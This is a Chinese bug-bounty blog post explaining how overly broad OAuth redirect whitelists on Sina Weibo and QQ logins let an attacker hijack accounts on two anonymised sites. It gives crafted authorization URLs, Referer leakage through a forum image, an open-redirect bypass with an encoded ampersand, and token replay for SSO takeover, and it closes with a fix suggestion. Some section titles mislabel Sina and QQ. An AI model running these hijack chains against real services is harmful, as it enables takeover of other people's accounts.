---
layout: post
title: 2018-01-20-另外几个OAuth认证redirect_url设置过宽泛导致的授权劫持案例分享
categories: [bounty]
tags: [bounty]
---
这一篇也是延续第1篇的技巧，主要的问题还是网站在向授权第三方登记授权返回地址时设置太宽泛，再加上自己的网站也有些缺陷问题，最后导致黑客可以劫持这些第三方的授权，这一篇有几个案例，然后也包含一些服务器端的简单检测绕过。

由于`AAA.com`在新浪/QQ授权注册的`redirect_uri`白名单域名过于宽泛，导致黑客可通过1次点击无感方式劫持`AAA.com`/`BBB.com`用户新浪授权，可通过2次点击劫持`AAA.com`/`BBB.com`用户QQ授权，然后登陆账户。


首先我在`http://bbs.AAA.com/thread-19478133-14-1.html`帖子插入了外链图片
![5.png](C:\Users\todaro\Desktop\2018.1.20\5.png)

#### 【1】新浪微博授权劫持

测试账户绑定新浪微博“不止步的todaro”,该用户可通过新浪微博快速登录其绑定的AAA账户
![6.png](C:\Users\todaro\Desktop\2018.1.20\6.png)
在账号和新浪微博已经绑定的情况下点击
`https://account.AAA.com/sina.php?to=http://i.AAA.com/`
可以直接跳转到账户，不用再点击一次头像

新浪微博用于授权的原始链接如下：
```
http://api.t.sina.com.cn/oauth/authorize?oauth_token=0501473f35ee53cebe6eb8433d6520f5&oauth_callback=http%3A%2F%2Faccount.AAA.com%2Fsinalogin.php
```


这个`oauth_token`非常重要，简单来讲就是黑客提供这个值，然后用户使用这个值将账户与微博绑定，后期黑客就要拿着这个值和另外一个授权值去登陆用户账户。这个值也不是一成不变的，所以需要黑客先在自己的浏览器打开`https://account.AAA.com/`然后点击新浪授权，在链接中获取该值。

获取到`oauth_token=43544e7c96e437852021d6c5a2415f1c`

所以最后的劫持链接是
```
http://api.t.sina.com.cn/oauth/authorize?oauth_token=43544e7c96e437852021d6c5a2415f1c&oauth_callback=http://bbs.AAA.com/thread-19478133-14-1.html
```

用户请求后，直接通过referer泄露了另外一个授权要用到的参数`oauth_verifier`的值
![7.png](C:\Users\todaro\Desktop\2018.1.20\7.png)
Referer:
```
http://bbs.AAA.com/thread-19478133-14-1.html?oauth_token=43544e7c96e437852021d6c5a2415f1c&oauth_verifier=620201
```

之后黑客回到刚刚自己获取`oauth_token`值得窗口请求
```
http://account.AAA.com/sinalogin.php?oauth_token=43544e7c96e437852021d6c5a2415f1c&oauth_verifier=620201
```

黑客成功在自己浏览器中登录该新浪微博绑定的账户
![8.png](C:\Users\todaro\Desktop\2018.1.20\8.png)
在AAA.com登录，也意味着该账号对应绑定的邮箱也登录了BBB.com，因为他们设置了跨域账户互通

但是默认情况下只有用户通过直接post请求登录AAA.com才会触发登陆BBB.com

经过研究发现

只要请求如下链接
```
http://account.AAA.com/?p=login_success&error=0&message=&next=http%3A%2F%2Fi.AAA.com&secure=1&from=login&nerror=
```
之后会自动触发连锁请求
```
https://passport.BBB.com/ssoLogin?st=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiI4MDkyMTYxMiIsImV4cCI6MTUxNTgzNDA5Mn0.saw4LnkC7LR7kHdB3yu64vJ_t_XpDp02QXbVfvhc1TI
```
当然这个st无从猜解

有了这个请求之后，passport.BBB.com也就登录成功了

所以黑客授权劫持后，试着请求一下，最后成功登录其BBB.com的账户
![9.png](C:\Users\todaro\Desktop\2018.1.20\9.png)
黑客访问
`https://passport.BBB.com`
成功
![10.png](C:\Users\todaro\Desktop\2018.1.20\10.png)
至此完成了对新浪授权登录账户的劫持，新浪用户只需要第一次授权要点确定，后面直接授权，无需任何操作，对用户来说是完全无感的。

#### 【2】新浪微博劫持

用户将自己的QQ与AAA.com的账户进行绑定

QQ授权登录的原始链接为
```
https://graph.qq.com/oauth2.0/show?which=Login&display=pc&response_type=code&client_id=XXXXXX&redirect_uri=http://account.AAA.com/qqlogin.php&state=a84bce6b18ea21337cf832d8da3eff08&scope=get_user_info
```

这里每次的`state`参数同上面的`oauth_token`一样都是变化的，所以黑客需要先在自己的浏览器访问获取改值
![11.jpg](C:\Users\todaro\Desktop\2018.1.20\11.jpg)
```
https://graph.qq.com/oauth2.0/show?which=Login&display=pc&response_type=code&client_id=XXXXXX&redirect_uri=http://account.AAA.com/qqlogin.php&state=7fd233c9f34a007745e2773755121b53&scope=get_user_info
```

将链接修改为如下，并让用户访问
```
https://graph.qq.com/oauth2.0/show?which=Login&display=pc&response_type=code&client_id=XXXXXX&redirect_uri=http://bbs.AAA.com/thread-19478133-14-1.html&state=7fd233c9f34a007745e2773755121b53&scope=get_user_info
```
获得
![12.png](C:\Users\todaro\Desktop\2018.1.20\12.png)
Referer:
```
http://bbs.AAA.com/thread-19478133-14-1.html?code=C35B9259FB0E81135F126AFA50FC967B&state=7fd233c9f34a007745e2773755121b53
```

黑客回到刚刚获取`state`参数的浏览器，访问
```
http://account.AAA.com/qqlogin.php?code=C35B9259FB0E81135F126AFA50FC967B&state=7fd233c9f34a007745e2773755121b53
```

黑客成功登录用户账户
![13.png](C:\Users\todaro\Desktop\2018.1.20\8.png)
黑客随后请求
```
http://account.AAA.com/?p=login_success&error=0&message=&next=http%3A%2F%2Fi.AAA.com&secure=1&from=login&nerror=
```
黑客接着请求`https://passport.BBB.com`

黑客成功登录其BBB.com账户
![14.png](C:\Users\todaro\Desktop\2018.1.20\10.png)
至此完成了对qq授权登录账户的劫持，qq授权每次都是要点击头像授权的，所以它不像新浪那么方便。

#### 【3】当授权返回地址限制到特定域名但是没有限制到特定目录时还是会出问题

当在新浪设置`oauth_callback`为`account.AAA.com`而不是`account.AAA.com/sinalogin.php`时，如果`account.AAA.com`域名下存在重定向漏洞，那么还是可以通过referer将授权数据传递出去。

于是接下来最关键的是找到`account.AAA.com`域名下的重定向漏洞

比如
```
https://account.AAA.com/?p=login_success&error=0&message=&next=http://i.AAA.com/&secure=1&from=login&nerror=
```
和
```
https://passport.AAA.com/logout?to=https://baidu.com/
```
前者需要登录后访问，后者都退出了，即使获取到code也是没有用，都被销毁了。

如果直接修改`next`参数为`www.baidu.com`
即
```
https://account.AAA.com/?p=login_success&error=0&message=&next=http://www.baidu.com/&secure=1&from=login&nerror=
```
并不会跳到`http://www.baidu.com`

简单绕过，即
```
https://account.AAA.com/?p=login_success&error=0&message=&next=http://i.AAA.com.www.baidu.com/&secure=1&from=login&nerror=
```
则能正确跳转到`http://i.AAA.com.www.baidu.com/`

那直接把链接放到`oauth_callback`即
```
http://api.t.sina.com.cn/oauth/authorize?oauth_token=7d5484c0f195334471a44b04ff5d3cf7&oauth_callback=https://account.AAA.com/?p=login_success&error=0&message=&next=http://i.AAA.com.www.baidu.com/&secure=1&from=login&nerror=
```
还是不行的，观察请求数据你就会发现

服务器只获取到`https://account.AAA.com/?p=login_success`，即第一个&前面的参数及数据，剩下的都丢弃，最后返回
```
https://account.AAA.com/?p=login_success&oauth_token=64cefef639db56f825d14a52da67e0fc&oauth_verifier=637190`
```
这样当然不行，经过测试，要跳转需要的有效参数为`p`和`next`，二者缺一不可

如果修改为
```
http://api.t.sina.com.cn/oauth/authorize?oauth_token=7d5484c0f195334471a44b04ff5d3cf7&oauth_callback=https://account.AAA.com/?next=http://i.AAA.com.www.baidu.com/&p=login_success
```
还是会因为&的问题，最后返回
```
https://account.AAA.com/?next=http://i.AAA.com.www.baidu.com/&oauth_token=64cefef639db56f825d14a52da67e0fc&oauth_verifier=637190
```
因为少了`p=login_success`还是不能跳转成功

在这个地方卡了很久，实在没办法，想放弃然后直接找一个`account.AAA.com`域下的重定向漏洞，但是找到的都是要2个参数同时起作用，也就是要有`&`参与，最后肯定会有一个参数被丢弃导致不能跳转。

后来想了一下，碰碰运气，把`&`编码为`%26`，试了一下，居然成了！

即最后的链接是
```
http://api.t.sina.com.cn/oauth/authorize?oauth_token=7d5484c0f195334471a44b04ff5d3cf7&oauth_callback=https://account.AAA.com/?next=http://i.AAA.com.www.baidu.com/%26p=login_success
```

现在能正确跳转了，这时候又遇到一个问题了，在浏览器的规范中，https向http请求时是不会携带referer数据的，但黑客就是要通过referer参数来获取授权数据，这哪里行！

于是为了验证漏洞存在

我把`i.AAA.com.cp0.win`解析到192.30.253.112(这个是github的ip…)

所以你访问`https://i.AAA.com.cp0.win`实际上是访问`https://github.com`

源站是https，跳转后的站也是https，referer传输没问题了。

怎么找已经登录用户呢？bbs！

所以一切都通了。

黑客先在自己的浏览器访问`https://account.AAA.com/`
![13.png](C:\Users\todaro\Desktop\2018.1.20\13.png)
点击该按钮，获取到url中的`oauth_token`
![14.png](C:\Users\todaro\Desktop\2018.1.20\14.png)
`oauth_token=0645156deaa21088d5211897ab5fd332`

替换到下面的链接中，受害者访问如下链接
```
http://api.t.sina.com.cn/oauth/authorize?oauth_token=0645156deaa21088d5211897ab5fd332&oauth_callback=https://account.AAA.com/?next=https://i.AAA.com.itodaro.pw%26p=login_success
```
![15.png](C:\Users\todaro\Desktop\2018.1.20\15.png)
黑客成功获取到referer数据

Referer:
```
http://account.AAA.com/?next=https://i.AAA.com.cp.win&p=login_success&oauth_token=0645156deaa21088d5211897ab5fd332&oauth_verifier=235790
```
黑客在原来的浏览器访问
```
http://account.AAA.com/sinalogin.php?oauth_token=0645156deaa21088d5211897ab5fd332&oauth_verifier=235790
```
黑客成功登录受害者对应账号
![16.png](C:\Users\todaro\Desktop\2018.1.20\8.png)
黑客接着请求
```
http://account.AAA.com/?p=login_success&error=0&message=&next=http%3A%2F%2Fi.AAA.com&secure=1&from=login&nerror=
```
黑客接着请求`https://passport.BBB.com`

黑客成功登录BBB.com的账户
![17.png](C:\Users\todaro\Desktop\2018.1.20\10.png)
至此完成了对qq授权登录账户的劫持，qq授权每次都是要点击头像授权

#### 【4】修复建议
授权返回地址限制到目录级别，对外请求数据时需要做脱敏处理

## 最后这些洞加起来价值85人民币！